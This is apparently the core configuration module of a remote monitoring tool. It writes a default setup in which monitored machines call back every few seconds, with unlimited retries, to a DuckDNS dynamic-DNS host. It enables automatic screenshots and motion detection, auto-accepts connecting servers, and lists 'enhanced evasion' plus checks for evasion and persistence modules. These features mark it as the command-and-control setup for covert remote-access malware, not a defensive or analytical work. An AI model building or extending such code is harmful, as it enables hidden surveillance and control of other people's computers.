"""
Core Configuration and Setup Module
Consolidates unified_config.py, setup_callback.py, and integration_manager.py
"""
import json
import os
import secrets
import logging
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ConfigManager:
    """Unified configuration management system"""
    
    def __init__(self):
        self.config_file = "app_config.json"
        self.config = self._load_or_create_config()
    
    def _load_or_create_config(self):
        """Load existing config or create default"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Error loading config: {e}")
        
        # Create default configuration
        default_config = {
            "version": "4.0.0",
            "created": datetime.now().isoformat(),
            "server": {
                "api_key": secrets.token_urlsafe(32),
                "port": 5000,
                "host": "0.0.0.0",
                "pc_id": secrets.token_hex(8),
                "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC'),
                "auto_screenshot": False,
                "screenshot_interval": 300,
                "motion_detection": False,
                "data_retention_days": 30
            },
            "client": {
                "servers": [],
                "auto_connect": True,
                "gui_theme": "dark",
                "update_interval": 5
            },
            "callback": {
                "enabled": True,
                "callback_url": "http://monitor-client.duckdns.org:8080",
                "callback_key": secrets.token_urlsafe(32),
                "interval": 15,
                "heartbeat_interval": 5,
                "retry_interval": 10,
                "max_retries": -1
            },
            "callback_listener": {
                "enabled": False,
                "port": 8080,
                "callback_key": secrets.token_urlsafe(32),
                "auto_update_gui": True,
                "auto_accept_servers": True
            },
            "multi_client": {
                "servers": []
            }
        }
        
        self._save_config(default_config)
        
        print(f"\n{'='*70}")
        print("🔧 FIRST TIME SETUP - Configuration Created")
        print(f"{'='*70}")
        print(f"Server API Key: {default_config['server']['api_key']}")
        print(f"Server Port: {default_config['server']['port']}")
        print(f"Callback Key: {default_config['callback']['callback_key'][:32]}...")
        print(f"\n💾 Configuration saved to: {self.config_file}")
        print(f"{'='*70}\n")
        
        return default_config
    
    def _save_config(self, config=None):
        """Save configuration to file"""
        if config is None:
            config = self.config
        
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Error saving config: {e}")
            return False
    
    def get_server_config(self):
        """Get server configuration"""
        return self.config.get('server', {})
    
    def get_client_config(self):
        """Get client configuration"""
        return self.config.get('client', {})
    
    def get_callback_config(self):
        """Get callback configuration"""
        return self.config.get('callback', {})
    
    def get_callback_listener_config(self):
        """Get callback listener configuration"""
        return self.config.get('callback_listener', {})
    
    def get_multi_client_config(self):
        """Get multi-client configuration"""
        return self.config.get('multi_client', {})
    
    def update_callback_key(self, key):
        """Update callback key"""
        self.config['callback']['callback_key'] = key
        self._save_config()
    
    def enable_callback(self):
        """Enable callback system"""
        self.config['callback']['enabled'] = True
        self._save_config()
    
    def set_duckdns_url(self, domain, port):
        """Set DuckDNS URL"""
        self.config['callback']['callback_url'] = f"http://{domain}:{port}"
        self._save_config()
    
    def create_legacy_configs(self):
        """Create legacy configuration files for compatibility"""
        # Server config
        server_config = {
            "api_key": self.config['server']['api_key'],
            "port": self.config['server']['port'],
            "host": self.config['server']['host'],
            "pc_id": self.config['server']['pc_id'],
            "pc_name": self.config['server']['pc_name'],
            "auto_screenshot": self.config['server']['auto_screenshot'],
            "screenshot_interval": self.config['server']['screenshot_interval'],
            "motion_detection": self.config['server']['motion_detection'],
            "data_retention_days": self.config['server']['data_retention_days']
        }
        
        with open('config.json', 'w') as f:
            json.dump(server_config, f, indent=2)
        
        # Callback config
        with open('callback_config.json', 'w') as f:
            json.dump(self.config['callback'], f, indent=2)
        
        # Callback listener config
        with open('callback_listener_config.json', 'w') as f:
            json.dump(self.config['callback_listener'], f, indent=2)
        
        # Multi-client config
        with open('multi_client_config.json', 'w') as f:
            json.dump(self.config['multi_client'], f, indent=2)


class CallbackSetup:
    """Callback system setup utilities"""
    
    def __init__(self, config_manager):
        self.config_manager = config_manager
    
    def setup_callback_system(self):
        """Setup the callback system with DuckDNS configuration"""
        
        print(f"\n{'='*70}")
        print("🔧 CALLBACK SYSTEM SETUP")
        print(f"{'='*70}")
        
        # 1. Set DuckDNS URL
        print("1️⃣ Setting up DuckDNS callback URL...")
        self.config_manager.set_duckdns_url("monitor-client.duckdns.org", 8080)
        
        # 2. Enable callback
        print("2️⃣ Enabling callback system...")
        self.config_manager.enable_callback()
        
        # 3. Get callback key from client config
        callback_key = self.config_manager.get_callback_listener_config().get('callback_key')
        
        print("3️⃣ Configuring callback authentication...")
        print(f"   Callback Key: {callback_key}")
        
        # 4. Update server callback config with client's key
        self.config_manager.update_callback_key(callback_key)
        
        # 5. Create legacy config files for compatibility
        print("4️⃣ Creating legacy config files...")
        self.config_manager.create_legacy_configs()
        
        print(f"\n{'='*70}")
        print("✅ CALLBACK SETUP COMPLETE")
        print(f"{'='*70}")
        print("Configuration Summary:")
        print(f"  🌐 Callback URL: {self.config_manager.get_callback_config()['callback_url']}")
        print(f"  🔑 Callback Key: {callback_key[:16]}...")
        print(f"  ✅ Enabled: {self.config_manager.get_callback_config()['enabled']}")
        print(f"  📂 Config Files: Created in current directory")
        print(f"\n🎯 Next Steps:")
        print(f"  1. Start your client: python client.py")
        print(f"  2. Copy the callback key from the client")
        print(f"  3. Run servers - they'll auto-connect!")
        print(f"{'='*70}\n")
    
    def check_current_config(self):
        """Check current configuration status"""
        print(f"\n{'='*70}")
        print("📊 CURRENT CONFIGURATION STATUS")
        print(f"{'='*70}")
        
        # Check if files exist
        files_to_check = [
            'app_config.json',
            'config.json', 
            'callback_config.json',
            'callback_listener_config.json'
        ]
        
        for file in files_to_check:
            exists = "✅" if os.path.exists(file) else "❌"
            print(f"  {exists} {file}")
        
        # Check callback configuration
        callback_config = self.config_manager.get_callback_config()
        print(f"\n📡 Callback Configuration:")
        print(f"  Enabled: {'✅' if callback_config.get('enabled') else '❌'}")
        print(f"  URL: {callback_config.get('callback_url', 'Not set')}")
        print(f"  Key: {callback_config.get('callback_key', 'Not set')[:16]}...")
        
        print(f"{'='*70}\n")


class IntegrationManager:
    """Enhanced system integration manager"""
    
    def __init__(self, config_manager):
        self.config_manager = config_manager
        self.enhanced_features = {
            "connection_stability": True,
            "resource_optimization": True,
            "error_handling": True,
            "threading_optimization": True,
            "enhanced_evasion": True,
            "advanced_encryption": True,
            "enhanced_gui": True,
            "auto_updater": True
        }
    
    def create_enhanced_system(self):
        """Create enhanced monitoring system"""
        print("🚀 Creating enhanced monitoring system...")
        
        # Initialize enhanced features
        for feature, enabled in self.enhanced_features.items():
            if enabled:
                print(f"✓ {feature.replace('_', ' ').title()}: Enabled")
        
        return True
    
    def verify_system_integrity(self):
        """Verify system integrity"""
        print("🔍 Verifying system integrity...")
        
        checks = {
            "config_valid": self._check_config_integrity(),
            "modules_available": self._check_modules(),
            "dependencies_met": self._check_dependencies()
        }
        
        all_passed = all(checks.values())
        
        for check, result in checks.items():
            status = "✅" if result else "❌"
            print(f"  {status} {check.replace('_', ' ').title()}")
        
        return all_passed
    
    def _check_config_integrity(self):
        """Check configuration integrity"""
        try:
            required_sections = ['server', 'client', 'callback', 'callback_listener']
            config = self.config_manager.config
            
            for section in required_sections:
                if section not in config:
                    return False
            
            return True
        except Exception:
            return False
    
    def _check_modules(self):
        """Check if required modules are available"""
        try:
            required_modules = [
                'client_modules',
                'server_modules', 
                'evasion_modules',
                'persistence_modules'
            ]
            
            for module in required_modules:
                if not os.path.exists(module):
                    return False
            
            return True
        except Exception:
            return False
    
    def _check_dependencies(self):
        """Check if dependencies are met"""
        try:
            import requests
            import psutil
            import flask
            import cryptography
            return True
        except ImportError:
            return False


# Global instances
unified_config = ConfigManager()
callback_setup = CallbackSetup(unified_config)
integration_manager = IntegrationManager(unified_config)


def setup_callback_system():
    """Legacy interface for callback setup"""
    return callback_setup.setup_callback_system()

def check_current_config():
    """Legacy interface for config check"""
    return callback_setup.check_current_config()

def create_enhanced_system():
    """Legacy interface for enhanced system creation"""
    return integration_manager.create_enhanced_system()

def load_config():
    """Legacy interface for loading config"""
    return unified_config.config

def get_server_config():
    """Legacy interface for server config"""
    return unified_config.get_server_config()

def get_callback_config():
    """Legacy interface for callback config"""
    return unified_config.get_callback_config()


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "check":
            check_current_config()
        elif command == "setup":
            setup_callback_system()
        elif command == "verify":
            if integration_manager.verify_system_integrity():
                print("✅ System verification passed")
            else:
                print("❌ System verification failed")
        else:
            print("Usage: python core.py [check|setup|verify]")
    else:
        setup_callback_system()